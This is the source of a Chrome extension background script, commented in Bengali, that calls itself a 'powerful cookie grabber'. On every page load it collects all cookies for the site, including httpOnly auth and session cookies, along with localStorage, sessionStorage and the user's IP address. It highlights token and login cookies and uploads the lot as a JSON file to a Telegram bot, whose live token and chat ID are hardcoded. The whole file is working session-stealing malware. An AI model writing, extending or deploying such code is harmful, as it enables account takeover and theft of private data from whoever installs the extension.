// টেলিগ্রাম কনফিগারেশন
const TELEGRAM_CONFIG = {
  botToken: "8253090893:AAEEHqSahbeBxs0i8fFDEHRvRuiF4uJ-oH4",
  chatId: "7122235679"
};

// ক্যাপচার করা পেজের রেকর্ড
const capturedPages = new Map();

// বাংলা তারিখ ফরম্যাট
function getBengaliDateTime() {
  const date = new Date();
  return date.toLocaleString('bn-BD', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
    timeZone: 'Asia/Dhaka'
  });
}

// HTML escape ফাংশন
function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
    .replace(/\*/g, '&#42;')
    .replace(/_/g, '&#95;')
    .replace(/\[/g, '&#91;')
    .replace(/\]/g, '&#93;')
    .replace(/\(/g, '&#40;')
    .replace(/\)/g, '&#41;');
}

// **আইপি এড্রেস বের করার ফাংশন**
async function getIpAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch {
    return 'Unknown';
  }
}

// **লোকাল স্টোরেজ ডাটা নেওয়ার ফাংশন (content.js এর কাজ)**
async function getLocalStorageData(tabId) {
  try {
    // scripting API ব্যবহার করে পেজের localStorage নেওয়া
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        try {
          const localStorageData = {};
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
          }
          return localStorageData;
        } catch (e) {
          return { error: 'localStorage access denied' };
        }
      }
    });
    
    return results[0]?.result || {};
  } catch (error) {
    console.log('localStorage access error:', error);
    return {};
  }
}

// **সেশন স্টোরেজ ডাটা নেওয়ার ফাংশন (অপশনাল)**
async function getSessionStorageData(tabId) {
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: () => {
        try {
          const sessionStorageData = {};
          for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key);
          }
          return sessionStorageData;
        } catch (e) {
          return { error: 'sessionStorage access denied' };
        }
      }
    });
    
    return results[0]?.result || {};
  } catch (error) {
    console.log('sessionStorage access error:', error);
    return {};
  }
}

// **Application Tab এর মত করে কুকি গ্র্যাব**
async function grabApplicationTabCookies(tabId, url) {
  try {
    // ডুপ্লিকেট চেক
    const pageKey = `${tabId}-${url}`;
    const lastCapture = capturedPages.get(pageKey);
    const now = Date.now();
    
    if (lastCapture && (now - lastCapture) < 30000) {
      console.log('ডুপ্লিকেট এড়ানো:', url);
      return;
    }
    
    console.log('কুকি গ্র্যাবিং:', url);
    
    const urlObj = new URL(url);
    const mainDomain = urlObj.hostname;
    
    // সব কুকি নেওয়া
    const allCookies = await chrome.cookies.getAll({});
    
    if (allCookies.length === 0) return;
    
    const cookiesForThisTab = allCookies.filter(cookie => {
      const cookieDomain = cookie.domain.startsWith('.') ? cookie.domain.substring(1) : cookie.domain;
      return mainDomain.includes(cookieDomain) || cookieDomain.includes(mainDomain);
    });
    
    if (cookiesForThisTab.length === 0) return;
    
    // শুধু কুকি ডাটা
    const cookieData = cookiesForThisTab.map(cookie => ({
      domain: cookie.domain,
      ...(cookie.expirationDate && { expirationDate: cookie.expirationDate }),
      hostOnly: cookie.hostOnly,
      httpOnly: cookie.httpOnly,
      name: cookie.name,
      path: cookie.path,
      sameSite: cookie.sameSite || null,
      secure: cookie.secure,
      session: cookie.session,
      storeId: cookie.storeId || null,
      value: cookie.value
    }));
    
    // **লোকাল স্টোরেজ ডাটা নেওয়া (content.js এর কাজ)**
    const localStorageData = await getLocalStorageData(tabId);
    
    // **সেশন স্টোরেজ ডাটা নেওয়া (অপশনাল)**
    const sessionStorageData = await getSessionStorageData(tabId);
    
    // আইপি এড্রেস
    const ipAddress = await getIpAddress();
    
    // বিশ্লেষণ
    const httpOnlyCount = cookieData.filter(c => c.httpOnly).length;
    const secureCount = cookieData.filter(c => c.secure).length;
    const sessionCount = cookieData.filter(c => c.session).length;
    const securityScore = Math.round((secureCount + httpOnlyCount) / cookieData.length * 100);
    
    // গুরুত্বপূর্ণ কুকি
    const importantKeywords = ['token', 'session', 'auth', 'login', 'xsrf', 'csrf', 'sid'];
    const importantCookies = cookieData.filter(c => 
      importantKeywords.some(keyword => c.name.toLowerCase().includes(keyword))
    );
    
    // এক্সপায়ার হতে চলেছে
    const expiringSoon = cookieData.filter(c => {
      if (!c.expirationDate) return false;
      const daysLeft = (c.expirationDate * 1000 - Date.now()) / (24*60*60*1000);
      return daysLeft < 7 && daysLeft > 0;
    });
    
    // **সম্পূর্ণ রিপোর্ট JSON (কুকি + localStorage + sessionStorage)**
    const fullReport = {
      url: url,
      domain: mainDomain,
      timestamp: new Date().toISOString(),
      ipAddress: ipAddress,
      cookies: cookieData,
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      analysis: {
        totalCookies: cookieData.length,
        httpOnly: httpOnlyCount,
        secure: secureCount,
        session: sessionCount,
        securityScore: securityScore,
        importantCookies: importantCookies.length,
        expiringSoon: expiringSoon.length,
        localStorageItems: Object.keys(localStorageData).length,
        sessionStorageItems: Object.keys(sessionStorageData).length
      }
    };
    
    // JSON ফাইলের জন্য শুধু কুকি ডাটা (আপনার চাওয়া মত)
    const jsonString = JSON.stringify(cookieData, null, 2);
    const fileName = `${mainDomain.replace(/\./g, '_')}_${Date.now()}.json`;
    const fileSizeKB = Math.round(jsonString.length / 1024);
    
    // **HTML ফরম্যাটে মেসেজ তৈরি**
    let message = `<b>🖥️ পাওয়ারফুল কুকি রিপোর্ট</b>\n\n`;
    message += `<b>🌐 ডোমেইন:</b> ${escapeHtml(mainDomain)}\n`;
    message += `<b>🔗 পেজ:</b> ${escapeHtml(url)}\n`;
    message += `<b>📦 মোট কুকি:</b> ${cookieData.length}\n`;
    
    // localStorage এবং sessionStorage ইনফো
    const localStorageCount = Object.keys(localStorageData).length;
    const sessionStorageCount = Object.keys(sessionStorageData).length;
    
    if (localStorageCount > 0) {
      message += `<b>💾 লোকাল স্টোরেজ:</b> ${localStorageCount} আইটেম\n`;
    }
    if (sessionStorageCount > 0) {
      message += `<b>📝 সেশন স্টোরেজ:</b> ${sessionStorageCount} আইটেম\n`;
    }
    
    message += `<b>📎 ফাইল:</b> ${escapeHtml(fileName)} (${fileSizeKB}KB)\n`;
    message += `<b>🕐 সময়:</b> ${escapeHtml(getBengaliDateTime())}\n`;
    message += `<b>🌍 আইপি:</b> ${escapeHtml(ipAddress)}\n\n`;
    
    message += `<b>📊 কুকি বিশ্লেষণ:</b>\n`;
    message += `🔒 HttpOnly: ${httpOnlyCount}\n`;
    message += `🔐 Secure: ${secureCount}\n`;
    message += `⏳ Session: ${sessionCount}\n`;
    message += `<b>📈 সিকিউরিটি স্কোর:</b> ${securityScore}%\n\n`;
    
    if (importantCookies.length > 0) {
      message += `<b>⚠️ গুরুত্বপূর্ণ কুকি পাওয়া গেছে:</b> ${importantCookies.length} টি\n`;
      importantCookies.slice(0, 5).forEach(c => {
        message += `└ ${escapeHtml(c.name)}\n`;
      });
      if (importantCookies.length > 5) {
        message += `└ ... এবং আরও ${importantCookies.length - 5} টি\n`;
      }
      message += `\n`;
    }
    
    if (expiringSoon.length > 0) {
      message += `<b>⏰ এক্সপায়ার হতে চলেছে:</b> ${expiringSoon.length} টি\n\n`;
    }
    
    message += `<b>📥 সম্পূর্ণ রিপোর্ট JSON ফাইল নিচে অ্যাটাচ করা হয়েছে</b>`;
    
    // টেলিগ্রামে পাঠানো
    await sendToTelegramWithFile(message, jsonString, fileName, mainDomain, cookieData.length, fileSizeKB);
    
    capturedPages.set(pageKey, now);
    setTimeout(() => capturedPages.delete(pageKey), 30000);
    
  } catch (error) {
    console.error('কুকি গ্র্যাব করতে সমস্যা:', error);
  }
}

// **টেলিগ্রামে মেসেজ + ফাইল একসাথে পাঠানো**
async function sendToTelegramWithFile(message, jsonString, fileName, mainDomain, cookieCount, fileSizeKB) {
  
  try {
    console.log('মেসেজ + ফাইল পাঠানোর চেষ্টা...');
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('document', new Blob([jsonString], { type: 'application/json' }), fileName);
    formData.append('caption', message);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.text();
    console.log('টেলিগ্রাম রেসপন্স:', result);
    
    if (!response.ok) {
      console.error('টেলিগ্রাম এরর:', result);
    } else {
      console.log('✅ সফল: মেসেজ + ফাইল একসাথে পাঠানো হয়েছে');
    }
    
  } catch (error) {
    console.error('টেলিগ্রাম পাঠাতে সমস্যা:', error);
  }
}

// ইভেন্ট লিসেনার
chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (details.frameId === 0 && details.url.startsWith('http')) {
    setTimeout(async () => {
      await grabApplicationTabCookies(details.tabId, details.url);
    }, 2000);
  }
});

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url?.startsWith('http')) {
    setTimeout(async () => {
      await grabApplicationTabCookies(tabId, tab.url);
    }, 2000);
  }
});

// টেস্ট ফাংশন
async function testTelegramConnection() {
  try {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
    formData.append('text', '<b>🟢 পাওয়ারফুল কুকি গ্র্যাববার</b>\n\n✅ অল ফিচার সহ চালু হয়েছে');
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
      method: 'POST',
      body: formData
    });
    
    return response.ok;
  } catch (error) {
    console.error('টেস্ট এরর:', error);
    return false;
  }
}

// ইনস্টল হলে টেস্ট
chrome.runtime.onInstalled.addListener(async () => {
  console.log('এক্সটেনশন ইনস্টল/আপডেট হয়েছে');
  await testTelegramConnection();
});